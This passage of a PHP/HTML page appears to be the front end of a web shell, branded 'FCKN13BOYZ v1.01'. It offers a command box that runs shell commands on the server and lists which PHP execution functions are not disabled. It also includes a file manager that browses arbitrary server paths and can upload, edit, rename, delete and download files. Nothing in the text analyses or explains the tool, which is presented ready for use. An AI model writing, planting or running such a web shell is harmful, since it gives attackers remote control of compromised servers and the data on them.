                </div>
            </div>
            <div>
                <span class="badge bg-danger">
                    <i class="bi bi-shield-check"></i> Secure
                </span>
                <a href="?logout=true" class="btn btn-sm btn-outline-danger ms-2" onclick="return confirm('Logout?')">
                    <i class="bi bi-box-arrow-right"></i> Logout
                </a>
            </div>
        </div>
    </div>
</div>

<div class="container mt-4">
    <div class="file-manager">
        <!-- Navigation -->
        <div class="d-flex justify-content-between align-items-center mb-3">
            <div>
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <?php
                        $paths = explode('/', trim($path, '/'));
                        $currentPath = '';
                        echo '<li class="breadcrumb-item"><a href="?path=' . htmlspecialchars($baseDir) . '"><i class="bi bi-house"></i></a></li>';
                        foreach ($paths as $index => $folder) {
                            $currentPath .= '/' . $folder;
                            echo '<li class="breadcrumb-item' . ($index === count($paths) - 1 ? ' active' : '') . '">
                                <a href="?path=' . htmlspecialchars($currentPath) . '">' . htmlspecialchars($folder) . '</a>
                            </li>';
                        }
                        ?>
                    </ol>
                </nav>
            </div>
            <div>
                <button class="btn btn-sm btn-outline-danger" onclick="$('#uploadModal').modal('show')">
                    <i class="bi bi-upload"></i>
                </button>
                <button class="btn btn-sm btn-outline-success" onclick="$('#createFileModal').modal('show')">
                    <i class="bi bi-file-plus"></i>
                </button>
                <button class="btn btn-sm btn-outline-warning" onclick="$('#createFolderModal').modal('show')">
                    <i class="bi bi-folder-plus"></i>
                </button>
            </div>
        </div>
        
        <!-- Shell Command - VERSI KUAT -->
        <div class="mb-3">
            <form method="POST" id="cmdForm">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <div class="input-group">
                    <span class="input-group-text">
                        <i class="bi bi-terminal"></i> $
                    </span>
                    <input type="text" name="cmd" class="form-control" placeholder="Enter command..." style="color: #ff5555; font-family: 'Courier New', monospace;">
                    <button class="btn btn-outline-danger" type="submit">
                        <i class="bi bi-play"></i> Execute
                    </button>
                </div>
            </form>
            <?php if ($cmdResult !== null): ?>
                <div class="shell-box mt-2">
                    <?php if (isset($cmdMethod)): ?>
                        <div class="command-status">
                            <span class="badge bg-danger">Method: <?php echo htmlspecialchars($cmdMethod); ?></span>
                        </div>
                    <?php endif; ?>
                    <pre><?php echo htmlspecialchars($cmdResult); ?></pre>
                </div>
            <?php endif; ?>
            
            <!-- Info metode yang tersedia -->
            <div class="mt-2">
                <small class="text-muted">
                    <i class="bi bi-info-circle"></i> Available methods: 
                    <?php
                    $available = [];
                    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) $available[] = 'exec';
                    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) $available[] = 'shell_exec';
                    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) $available[] = 'system';
                    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) $available[] = 'passthru';
                    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) $available[] = 'proc_open';
                    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) $available[] = 'popen';
                    
                    if (empty($available)) {
                        echo '<span class="text-danger">No execution methods available!</span>';
                    } else {
                        echo '<span class="text-success">' . implode(', ', $available) . '</span>';
                    }
                    ?>
                </small>
            </div>
        </div>
        
        <!-- File List -->
        <div class="table-responsive">
            <table class="table table-hover">
                <thead>
                    <tr>
                        <th><i class="bi bi-type"></i> Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    // Parent directory
                    $parentPath = dirname($path);
                    if ($parentPath && realpath($parentPath) !== realpath($path)) {
                        echo '<tr>
                            <td><a href="?path=' . htmlspecialchars($parentPath) . '" style="color: #ff5555;"><i class="bi bi-arrow-up-circle"></i> ..</a></td>
                            <td>--</td>
                            <td>--</td>
                            <td>--</td>
                        </tr>';
                    }
                    
                    // List folders and files
                    $folders = [];
                    $files = [];
                    if ($scandir = scandir($path)) {
                        foreach ($scandir as $item) {
                            if ($item === '.' || $item === '..') continue;
                            $fullpath = "$path/$item";
                            if (is_dir($fullpath)) {
                                $folders[] = $item;
                            } else {
                                $files[] = $item;
                            }
                        }
                    }
                    
                    foreach ($folders as $folder) {
                        $fullpath = "$path/$folder";
                        echo '<tr>
                            <td><i class="bi bi-folder" style="color: #ff9900;"></i> <a href="?path=' . htmlspecialchars($fullpath) . '" style="color: #ff5555;">' . htmlspecialchars($folder) . '</a></td>
                            <td>--</td>
                            <td>' . getPermissions($fullpath) . '</td>
                            <td>
                                <button class="btn btn-sm btn-outline-warning rename-btn" data-path="' . htmlspecialchars($fullpath) . '">
                                    <i class="bi bi-pencil"></i>
                                </button>
                                <button class="btn btn-sm btn-outline-danger delete-btn" data-path="' . htmlspecialchars($fullpath) . '">
                                    <i class="bi bi-trash"></i>
                                </button>
                            </td>
                        </tr>';
                    }
                    
                    foreach ($files as $file) {
                        $fullpath = "$path/$file";
                        $size = filesize($fullpath);
                        $sizeFormatted = $size < 1024 ? $size . ' B' : ($size < 1048576 ? round($size/1024, 1) . ' KB' : round($size/1048576, 2) . ' MB');
                        echo '<tr>
                            <td><i class="bi bi-file-earmark" style="color: #ff4444;"></i> ' . htmlspecialchars($file) . '</td>
                            <td>' . $sizeFormatted . '</td>
                            <td>' . getPermissions($fullpath) . '</td>
                            <td>
                                <button class="btn btn-sm btn-outline-primary edit-btn" data-path="' . htmlspecialchars($fullpath) . '">
                                    <i class="bi bi-pencil-square"></i>
                                </button>
                                <button class="btn btn-sm btn-outline-warning rename-btn" data-path="' . htmlspecialchars($fullpath) . '">
                                    <i class="bi bi-pencil"></i>
                                </button>
                                <button class="btn btn-sm btn-outline-danger delete-btn" data-path="' . htmlspecialchars($fullpath) . '">
                                    <i class="bi bi-trash"></i>
                                </button>
                                <a href="?download=' . htmlspecialchars($fullpath) . '" class="btn btn-sm btn-outline-success">
                                    <i class="bi bi-download"></i>
                                </a>
                            </td>
                        </tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- Modals -->
<!-- Upload Modal -->
<div class="modal fade" id="uploadModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" style="color: #ff4444;"><i class="bi bi-upload"></i> Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="action" value="upload">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label" style="color: #fff;">Select file to upload</label>
                        <input type="file" name="file" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-danger">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Create File Modal -->
<div class="modal fade" id="createFileModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" style="color: #ff5555;"><i class="bi bi-file-plus"></i> Create File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="action" value="create_file">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label" style="color: #fff;">File Name</label>
                        <input type="text" name="name" class="form-control" placeholder="example.txt" required pattern="[a-zA-Z0-9_\-\.]+">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-danger">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Create Folder Modal -->
<div class="modal fade" id="createFolderModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" style="color: #ff7733;"><i class="bi bi-folder-plus"></i> Create Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="action" value="create_folder">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label" style="color: #fff;">Folder Name</label>
                        <input type="text" name="name" class="form-control" placeholder="new_folder" required pattern="[a-zA-Z0-9_\-]+">
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-danger">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Edit Modal -->
<div class="modal fade" id="editModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" style="color: #ff5555;"><i class="bi bi-pencil-square"></i> Edit File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <textarea id="fileContent" class="form-control" rows="15" style="font-family: 'Courier New', monospace; color: #ff6666;"></textarea>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-danger save-changes-btn">
                    <i class="bi bi-save"></i> Save Changes
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Rename Modal -->
<div class="modal fade" id="renameModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" style="color: #ff7733;"><i class="bi bi-pencil"></i> Rename</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <input type="text" id="newName" class="form-control" placeholder="Enter new name" required>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-danger save-rename-btn">Rename</button>
            </div>
        </div>
    </div>
</div>

<div class="security-badge">
    <i class="bi bi-shield-lock-fill"></i> FCKN13BOYZ v1.01 • MY PRIDE NEVER BENDS
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
<script>
$(document).ready(function() {
    const csrfToken = '<?php echo $_SESSION['csrf_token']; ?>';
    
    // Delete action
    $('.delete-btn').click(function() {
        if (confirm('Are you sure you want to delete this item?')) {
            const path = $(this).data('path');
            $.post('', { action: 'delete', target: path, csrf_token: csrfToken }, function(response) {
                const res = JSON.parse(response);
                alert(res.message);
                if (res.status === 'success') location.reload();
            });
        }
    });
    
    // Edit action
    $('.edit-btn').click(function() {
        const path = $(this).data('path');
        $.post('', { action: 'edit', target: path, csrf_token: csrfToken }, function(response) {
            const res = JSON.parse(response);
            if (res.status === 'success') {
                $('#fileContent').val(res.content);
                $('.save-changes-btn').data('path', path);
                $('#editModal').modal('show');
            } else {
                alert(res.message);
            }
        });
    });
    
    // Save changes
    $('.save-changes-btn').click(function() {
        const path = $(this).data('path');
        const content = $('#fileContent').val();
        $.post('', { action: 'edit', target: path, content: content, csrf_token: csrfToken }, function(response) {
            const res = JSON.parse(response);
            alert(res.message);
            if (res.status === 'success') {
                $('#editModal').modal('hide');
                location.reload();
            }
        });
    });
    
    // Rename action
    $('.rename-btn').click(function() {
        const path = $(this).data('path');
        $('#renameModal').modal('show');
        $('.save-rename-btn').data('path', path);
        $('#newName').val('');
    });
    
    // Save rename
    $('.save-rename-btn').click(function() {
        const path = $(this).data('path');
        const newName = $('#newName').val();
        if (newName.trim() === '') {
            alert('Please enter a new name');
            return;
        }
        $.post('', { action: 'rename', target: path, new_name: newName, csrf_token: csrfToken }, function(response) {
            const res = JSON.parse(response);
            alert(res.message);
            if (res.status === 'success') {
                $('#renameModal').modal('hide');
                location.reload();
            }
        });
    });
});
</script>

</body>
</html>